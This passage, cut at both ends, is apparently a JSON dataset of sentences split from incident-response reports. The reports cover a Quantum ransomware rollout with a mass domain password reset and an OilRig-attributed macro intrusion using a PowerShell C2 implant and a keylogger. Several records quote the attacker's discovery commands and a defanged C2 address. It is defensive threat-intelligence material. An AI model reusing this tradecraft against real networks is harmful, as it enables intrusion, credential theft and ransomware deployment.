        "text": "Its unclear why the operator chose to do this, as this was around three hours prior to the ransomware being executed or a ransom note being dropped.",
        "type": "",
        "report": "r-dfir-3",
        "line": 232,
        "index": 4085
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S233",
        "text": "The alert message that was visible:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 233,
        "index": 4086
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S234",
        "text": "The activity can be observed in the PowerShell WinEvent logs:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 234,
        "index": 4087
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S235",
        "text": "The threat actors dropped the first of their ransomware binaries on the fourth day of the intrusion.",
        "type": "",
        "report": "r-dfir-3",
        "line": 235,
        "index": 4088
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S236",
        "text": "Around 40 minutes after creating the alert messages for Cobalt Strike to show up, they dropped locker_64.exe on the backup server.",
        "type": "",
        "report": "r-dfir-3",
        "line": 236,
        "index": 4089
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S237",
        "text": "They created a file (2.txt) and populated it with a list of hosts they had uncovered during their discovery activity.",
        "type": "",
        "report": "r-dfir-3",
        "line": 237,
        "index": 4090
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S238",
        "text": "The locker_64.exe file was then renamed to 64.exe and executed using the text file in the command arguments:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 238,
        "index": 4091
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S239",
        "text": "The threat actors attempted to execute the malware across all hosts in the target list, but only execution on the backup server was observed.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 239,
        "index": 4092
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S240",
        "text": "The threat actor then tried again on a different server using a DLL this time:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 240,
        "index": 4093
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S241",
        "text": "Again, only execution on the server was observed.",
        "type": "",
        "report": "r-dfir-3",
        "line": 241,
        "index": 4094
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S242",
        "text": "They then executed a new Cobalt Strike PowerShell beacon on a 3rd server and executed the ramsomware using that.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 242,
        "index": 4095
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S243",
        "text": "They then opened an RDP connection back to the primary domain controller and proceeded to try to execute the binary with a target list again.",
        "type": "",
        "report": "r-dfir-3",
        "line": 243,
        "index": 4096
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S244",
        "text": "After only affecting the single host, the threat actors dropped several batch scripts on the server:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 244,
        "index": 4097
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S245",
        "text": "The script pass.bat proceeded to reset all the user accounts in the domain to a single password set by the threat actors.",
        "type": "",
        "report": "r-dfir-3",
        "line": 245,
        "index": 4098
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S246",
        "text": "There were thousands of Windows Security Event ID 4724 events generated within a two minute period.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 246,
        "index": 4099
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S247",
        "text": "This password reset would enable the next scripts to function as intended while also hampering any recovery activity.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 247,
        "index": 4100
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S248",
        "text": "The 1.bat file then proceeded to copy the ransomware binary across to hosts in the environment.",
        "type": "",
        "report": "r-dfir-3",
        "line": 248,
        "index": 4101
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S249",
        "text": "Finally 2.bat used the reset password to enable psexec to execute the ransomware on all the remote hosts.",
        "type": "",
        "report": "r-dfir-3",
        "line": 249,
        "index": 4102
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S250",
        "text": "When the payload was executed, there were some telltale registry events observed indicating .Quantum file extension Shell Open Command artifacts.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 250,
        "index": 4103
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S251",
        "text": "The HTML message was dropped in various directories across the endpoints:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 251,
        "index": 4104
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S252",
        "text": "The HTML file displayed the all but familiar message:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 252,
        "index": 4105
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S253",
        "text": "The following Locker files were then deleted:",
        "type": "",
        "report": "r-dfir-3",
        "line": 253,
        "index": 4106
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S0",
        "text": "In this intrusion from August 2022, we observed a compromise that was initiated with a Word document containing a malicious VBA macro, which established persistence and communication to a command and control server (C2).",
        "type": "",
        "report": "r-dfir-4",
        "line": 0,
        "index": 4107
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S1",
        "text": "Upon performing initial discovery and user enumeration, the threat actor used AutoHotkey to launch a keylogger.",
        "type": "",
        "report": "r-dfir-4",
        "line": 1,
        "index": 4108
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S2",
        "text": "AutoHotkey is an open-source scripting language for Microsoft Windows machines that was introduced to provide easy keyboard shortcuts and automation.",
        "type": "",
        "report": "r-dfir-4",
        "line": 2,
        "index": 4109
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S3",
        "text": "As described in AutoHotkey documentation, the AHK script can be executed in a number of ways.",
        "type": "",
        "report": "r-dfir-4",
        "line": 3,
        "index": 4110
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S4",
        "text": "As observed in this intrusion, the adversary executed the AHK keylogger script by calling a renamed version of AutoHotkey.exe (module.exe) and passing the script\u2019s filename (module.ahk) as a command-line parameter.",
        "type": "",
        "report": "r-dfir-4",
        "line": 4,
        "index": 4111
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S5",
        "text": "The intrusion began with the execution of a malicious macro within a Word document.",
        "type": "",
        "report": "r-dfir-4",
        "line": 5,
        "index": 4112
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S6",
        "text": "The document was themed as a job application for the firm Lumen.",
        "type": "",
        "report": "r-dfir-4",
        "line": 6,
        "index": 4113
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S7",
        "text": "This tactic has been observed by many threat actor groups, including state sponsored actors in North Korea and Iran.",
        "type": "",
        "report": "r-dfir-4",
        "line": 7,
        "index": 4114
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S8",
        "text": "Upon opening the file, the user was prompted to enable macros to complete the form, which began execution of the malware.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 8,
        "index": 4115
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S9",
        "text": "Once executed, the macro created a VBS script (Updater.vbs), two PowerShell scripts (temp.ps1 and Script.ps1), and installed persistence through a scheduled task.",
        "type": "",
        "report": "r-dfir-4",
        "line": 9,
        "index": 4116
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S10",
        "text": "The implant was fully implemented in PowerShell, which is uncommon compared to many initial access tools today.",
        "type": "",
        "report": "r-dfir-4",
        "line": 10,
        "index": 4117
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S11",
        "text": "Following the execution of the VBA embedded macros, the PowerShell script, Script.ps1, began to connect to the C2 server through an encrypted channel.",
        "type": "",
        "report": "r-dfir-4",
        "line": 11,
        "index": 4118
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S12",
        "text": "Around a day after execution, the server became live and began sending instructions to the implant.",
        "type": "",
        "report": "r-dfir-4",
        "line": 12,
        "index": 4119
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S13",
        "text": "The instructions obtained from the server were then executed through the temp.ps1 PowerShell script.",
        "type": "",
        "report": "r-dfir-4",
        "line": 13,
        "index": 4120
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S14",
        "text": "The threat actors began executing basic discovery commands, all of which were executed via PowerShell cmdlets or built-in Windows utilities like whoami, net, time, tzutil and tracert; one exception to this was when the threat actors extracted a specific function from the PowerSploit framework, Convert-LDAPProperty, to enumerate domain accounts in the environment.",
        "type": "",
        "report": "r-dfir-4",
        "line": 14,
        "index": 4121
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S15",
        "text": "All data collected was then exfiltrated over the existing C2 channel.",
        "type": "",
        "report": "r-dfir-4",
        "line": 15,
        "index": 4122
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S16",
        "text": "On the fourth day of the intrusion, the threat actors became active again by dropping of a set of files that performed keylogger functions.",
        "type": "",
        "report": "r-dfir-4",
        "line": 16,
        "index": 4123
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S17",
        "text": "A scheduled task was then created to assist in execution of the keylogger.",
        "type": "",
        "report": "r-dfir-4",
        "line": 17,
        "index": 4124
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S18",
        "text": "The keylogger itself was comprised of an executable, module.exe, which was a renamed AutoHotkey binary.",
        "type": "",
        "report": "r-dfir-4",
        "line": 18,
        "index": 4125
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S19",
        "text": "This would run the AutoHotkey script module.ahk.",
        "type": "",
        "report": "r-dfir-4",
        "line": 19,
        "index": 4126
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S20",
        "text": "Additionally, a PowerShell script called readKey.ps1 would execute in the same task.",
        "type": "",
        "report": "r-dfir-4",
        "line": 20,
        "index": 4127
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S21",
        "text": "On the sixth day of the intrusion, the threat actors returned and collected the data compiled by the keylogger.",
        "type": "",
        "report": "r-dfir-4",
        "line": 21,
        "index": 4128
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S22",
        "text": "This was performed using the makecab.exe Windows utility to compress the keylogger files before exfiltrating them to the C2 server.",
        "type": "",
        "report": "r-dfir-4",
        "line": 22,
        "index": 4129
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S23",
        "text": "They then dropped another PowerShell script.",
        "type": "",
        "report": "r-dfir-4",
        "line": 23,
        "index": 4130
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S24",
        "text": "This script would take a screenshot of the desktop of the infected host.",
        "type": "",
        "report": "r-dfir-4",
        "line": 24,
        "index": 4131
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S25",
        "text": "After this data was exfiltrated, the threat actors reviewed the antivirus service status and some additional host data.",
        "type": "",
        "report": "r-dfir-4",
        "line": 25,
        "index": 4132
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S26",
        "text": "The threat actors returned again on the seventh and ninth days to collect the keylogger data.",
        "type": "",
        "report": "r-dfir-4",
        "line": 26,
        "index": 4133
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S27",
        "text": "The threat actors were not observed performing any further actions before being evicted from the environment.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 27,
        "index": 4134
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S28",
        "text": "One interesting fact about this case is that the initial implant was fully implemented using PowerShell, and no executables were dropped to the victim\u2019s workstation for the implant.",
        "type": "",
        "report": "r-dfir-4",
        "line": 28,
        "index": 4135
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S29",
        "text": "It\u2019s also interesting to note that the PowerShell implant was and stayed fully undetectable for a significant period of time.",
        "type": "",
        "report": "r-dfir-4",
        "line": 29,
        "index": 4136
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S30",
        "text": "This is contrary to many of our reported cases where the initial access relies on initial access brokers and common malware used by those groups such as Emotet, IcedID, or Qbot.",
        "type": "",
        "report": "r-dfir-4",
        "line": 30,
        "index": 4137
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S31",
        "text": "The use of custom tailored malware points to a more targeted or discerning organization compared to the spray-and-pray approach performed by many access brokers.",
        "type": "",
        "report": "r-dfir-4",
        "line": 31,
        "index": 4138
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S32",
        "text": "Reviewing the network traffic, we observed two signatures fire on the C2 traffic \u2013 ET MALWARE TA452 Related Backdoor Activity (GET)/(POST).",
        "type": "",
        "report": "r-dfir-4",
        "line": 32,
        "index": 4139
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S33",
        "text": "TA452 is an activity group tracked by Proofpoint that translates to the OilRig group.",
        "type": "",
        "report": "r-dfir-4",
        "line": 33,
        "index": 4140
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S34",
        "text": "Under other classifications there is overlap with COBALT GYPSY, IRN2, APT34, and Helix Kitten.",
        "type": "",
        "report": "r-dfir-4",
        "line": 34,
        "index": 4141
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S35",
        "text": "Oilrig is suspected of being an Iran based and state sponsored group.",
        "type": "",
        "report": "r-dfir-4",
        "line": 35,
        "index": 4142
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S36",
        "text": "This group is widely credited with creating and utilizing various home grown PowerShell frameworks to perform their intrusions.",
        "type": "",
        "report": "r-dfir-4",
        "line": 36,
        "index": 4143
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S37",
        "text": "Finally, analyzing the time of the threat actor hands on keyboard actions, the threat actors operated between Saturday and Thursday and no activity on Friday.",
        "type": "",
        "report": "r-dfir-4",
        "line": 37,
        "index": 4144
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S38",
        "text": "All activity took place place between 0300-1600 UTC which aligns with 0630-1930 (GMT +3:30) Tehran local time.",
        "type": "",
        "report": "r-dfir-4",
        "line": 38,
        "index": 4145
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S39",
        "text": "All of these factors together align to point to the Iranian Oilrig group as the likely threat actors behind this intrusion.",
        "type": "",
        "report": "r-dfir-4",
        "line": 39,
        "index": 4146
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S40",
        "text": "The initial access used in this intrusion was a malicious word document dubbed \u201cApply Form.docm\u201c.",
        "type": "",
        "report": "r-dfir-4",
        "line": 40,
        "index": 4147
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S41",
        "text": "This document purported to be an application form for the technology and telecommunications company Lumen.",
        "type": "",
        "report": "r-dfir-4",
        "line": 41,
        "index": 4148
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S42",
        "text": "This was originally found and shared by @StopMalvertisin in a tweet detailing the lure and the payload.",
        "type": "",
        "report": "r-dfir-4",
        "line": 42,
        "index": 4149
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S43",
        "text": "The precise delivery method remains unknown as we do not have direct evidence on how this malicious document was delivered.",
        "type": "",
        "report": "r-dfir-4",
        "line": 43,
        "index": 4150
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S44",
        "text": "We assert with a medium level of confidence, based on the previous similar reports, that those documents were likely delivered through spearphishing attachments in emails (T1566).\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 44,
        "index": 4151
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S45",
        "text": "This intrusion began with the execution of a malicious VBA macro embedded in a word document.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 45,
        "index": 4152
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S46",
        "text": "A first look at \u201cApply Form.docm\u201d with olevba.py, immediately highlights some suspicious behaviors.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 46,
        "index": 4153
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S47",
        "text": "First off, the macro gets the name of the user executing the Word document and creates a directory in AppData, if it doesn\u2019t exist:\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 47,
        "index": 4154
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S48",
        "text": "The malicious VBA macro then created two PowerShell scripts and one VBScript file in \u201cC:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Windows\\Update\\\u201d\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 48,
        "index": 4155
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S49",
        "text": "With Sysmon and FileCreate event 11, we can see that WINWORD.EXE successfully created these files:\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 49,
        "index": 4156
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S50",
        "text": "Then, in order to execute the script and install persistence, a new scheduled task was registered:\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 50,
        "index": 4157
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S51",
        "text": "The XML above describing the scheduled task was directly embedded in the VBA macro.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 51,
        "index": 4158
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S52",
        "text": "The first scheduled task installed using the malicious VBA macro, executed a VBS script, which in turn executed a PowerShell script named Script.ps1.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 52,
        "index": 4159
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S53",
        "text": "Script.ps1 contacts the C2 server and executed the base64 commands using temp.ps1.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 53,
        "index": 4160
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S54",
        "text": "Event 201 from Microsoft-Windows-TaskScheduler/Operational highlights the successful execution of this scheduled task.",
        "type": "",
        "report": "r-dfir-4",
        "line": 54,
        "index": 4161
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S55",
        "text": "Another scheduled task named MicrosoftEdgeUpdateTaskMachineUC was registered using schtasks.exe on the command line:\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 55,
        "index": 4162
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S56",
        "text": "The scheduled task was then started manually:\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 56,
        "index": 4163
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S57",
        "text": "The scheduled task was designed to execute module.exe and a PowerShell script named readKey.ps1.",
        "type": "",
        "report": "r-dfir-4",
        "line": 57,
        "index": 4164
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S58",
        "text": "These components will be explained later in the collection section of this report.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 58,
        "index": 4165
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S59",
        "text": "The threat actor\u2019s keylogger used in the intrusion implemented a XOR operation to encode the contents of data written to logFileuyovaqv.bin.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 59,
        "index": 4166
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S60",
        "text": "The threat actor removed various files created by the discovery actions during the intrusion.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 60,
        "index": 4167
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S61",
        "text": "Multiple discovery commands were executed by the threat actors.",
        "type": "",
        "report": "r-dfir-4",
        "line": 61,
        "index": 4168
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S62",
        "text": "Each command was executed via the temp.ps1 file with the input commands via base64 command line arguments.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 62,
        "index": 4169
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S63",
        "text": "During the intrusion, the threat actors executed the following for discovery tasks.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 63,
        "index": 4170
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S64",
        "text": "- List disk information: \"C:\\Windows\\System32\\Wbem\\WMIC.exe\" logicaldisk\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 64,
        "index": 4171
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S65",
        "text": "- List process: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -command Get-Process\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 65,
        "index": 4172
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S66",
        "text": "- Get information about Windows Defender service: \"C:\\Windows\\system32\\cmd.exe\" /c sc query WinDefend\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 66,
        "index": 4173
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S67",
        "text": "- Get current time on the victim\u2019s workstation: \"C:\\Windows\\system32\\cmd.exe\" /c time\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 67,
        "index": 4174
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S68",
        "text": "- Get time zone: \"C:\\Windows\\system32\\cmd.exe\" /c tzutil /g\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 68,
        "index": 4175
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S69",
        "text": "- Use TRACERT in order to discover network infrastructure: \"C:\\Windows\\system32\\cmd.exe\" /c tracert 8.8.8.8\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 69,
        "index": 4176
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S70",
        "text": "- Enumerate local accounts: \"C:\\Windows\\system32\\net.exe\" accounts\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 70,
        "index": 4177
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S71",
        "text": "- Get information on current user: \"C:\\Windows\\system32\\whoami.exe\" /all\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 71,
        "index": 4178
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S72",
        "text": "Enumerate files\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 72,
        "index": 4179
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S73",
        "text": "A PowerShell function based on the PowerSploit Convert-LDAPProperty code was used in order to retrieve information on domain accounts:\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 73,
        "index": 4180
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S74",
        "text": "Query AD & SAM account name\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 74,
        "index": 4181
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S75",
        "text": "Computer and network information discovery\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 75,
        "index": 4182
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S76",
        "text": "Get the account information for logged-on user of a Windows machine\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 76,
        "index": 4183
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S77",
        "text": "Gets the status of antimalware software on the computer.",
        "type": "",
        "report": "r-dfir-4",
        "line": 77,
        "index": 4184
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S78",
        "text": "List environment variables: ls $env:temp get-childitem $env:temp | out-string\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 78,
        "index": 4185
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S79",
        "text": "Get public IP address: Invoke-WebRequest -UseBasicParsing -Uri http://ident.me | out-string\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 79,
        "index": 4186
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S80",
        "text": "Before exfiltration, the data collected from LDAP discovery was written out to an XML file.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 80,
        "index": 4187
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S81",
        "text": "Threat actors also dropped and executed a PowerShell script using their temp.ps1 C2 script:\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 81,
        "index": 4188
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S82",
        "text": "The sc.ps1 file contained PowerShell code to capture a screenshot of the system.",
        "type": "",
        "report": "r-dfir-4",
        "line": 82,
        "index": 4189
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S83",
        "text": "The screenshots were taken upon the execution of this PowerShell script and then they were saved in the same directory as sc.png files.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 83,
        "index": 4190
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S84",
        "text": "A scheduled task named MicrosoftEdgeUpdateTaskMachineUC was created by the threat actors.",
        "type": "",
        "report": "r-dfir-4",
        "line": 84,
        "index": 4191
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S85",
        "text": "The program executed by this task was a keylogger.",
        "type": "",
        "report": "r-dfir-4",
        "line": 85,
        "index": 4192
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S86",
        "text": "This keylogger relied on the files module.exe, module.ahk, and readkey.ps1.",
        "type": "",
        "report": "r-dfir-4",
        "line": 86,
        "index": 4193
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S87",
        "text": "The file t.xml contained the task used to execute these files.",
        "type": "",
        "report": "r-dfir-4",
        "line": 87,
        "index": 4194
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S88",
        "text": "The executable, module.exe, is a renamed binary of AutoHotkey.",
        "type": "",
        "report": "r-dfir-4",
        "line": 88,
        "index": 4195
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S89",
        "text": "This is one of the ways in which you can execute an AutoHotkey (AHK) script.",
        "type": "",
        "report": "r-dfir-4",
        "line": 89,
        "index": 4196
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S90",
        "text": "The actual keylogger is the AHK script, module.ahk.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 90,
        "index": 4197
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S91",
        "text": "Navigating through the AHK script, we discovered artifacts of acquiring the keyboard layout and capturing pressed keys.",
        "type": "",
        "report": "r-dfir-4",
        "line": 91,
        "index": 4198
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S92",
        "text": "In addition, we notice there is a function named UpdateReg that accepts a text parameter.",
        "type": "",
        "report": "r-dfir-4",
        "line": 92,
        "index": 4199
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S93",
        "text": "This registry key is also found within the readkey.ps1 script and turns out to be where the keylogger saved captured keystrokes.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 93,
        "index": 4200
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S94",
        "text": "The readkey.ps1 file grabbed the keystrokes from the KeypressValue registry key, XOR\u2019s the data, and saves it to a log (logFileuyovaqv.bin) file.",
        "type": "",
        "report": "r-dfir-4",
        "line": 94,
        "index": 4201
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S95",
        "text": "The threat actors then made a cab file out of the collected keystrokes in preparation for exfiltration.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 95,
        "index": 4202
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S96",
        "text": "Activity to the C2 is established via execution of the Script.ps1 and temp.ps1 files.",
        "type": "",
        "report": "r-dfir-4",
        "line": 96,
        "index": 4203
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S97",
        "text": "Communication between the victim and C2 is encrypted using AES-CBC with the following Key and IV:\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 97,
        "index": 4204
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S98",
        "text": "First communication to the C2 (hxxp[:]//45[.]89[.]125[.]189/get) began on day one and beaconed in roughly 10-minute increments.",
        "type": "",
        "report": "r-dfir-4",
        "line": 98,
        "index": 4205
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S99",
        "text": "All requests return a 502 Bad Gateway error until day two.",
        "type": "",
        "report": "r-dfir-4",
        "line": 99,
        "index": 4206
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S100",
        "text": "First C2 communication breakdown:\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 100,
        "index": 4207
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S101",
        "text": "AES encrypted PowerShell command example:\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 101,
        "index": 4208
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S102",
        "text": "SafeBreach published similar findings from this C2 infrastructure, where they described the format in detail.",
        "type": "",
        "report": "r-dfir-4",
        "line": 102,
        "index": 4209
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S103",
        "text": "You can review their research here.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 103,
        "index": 4210
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S104",
        "text": "Several files collected during discovery tasks, such as domain user account information and later the keylogger collected data, were exfiltrated to the C2 server via POST requests.",
        "type": "",
        "report": "r-dfir-4",
        "line": 104,
        "index": 4211
    },
    {
        "id": "dfir-reports-filtered/r-dfir-4.md:::S105",
        "text": "During the intrusion, no final actions beyond data collection and discovery tasks were observed.\n",
        "type": "",
        "report": "r-dfir-4",
        "line": 105,
        "index": 4212
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S0",
        "text": "In this intrusion, a malicious ISO file was delivered to a user which contained Ursnif malware.",
        "type": "",
        "report": "r-dfir-5",
        "line": 0,
        "index": 4213
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S1",
        "text": "The malware displayed an interesting execution flow, which included using a renamed copy of rundll32.",
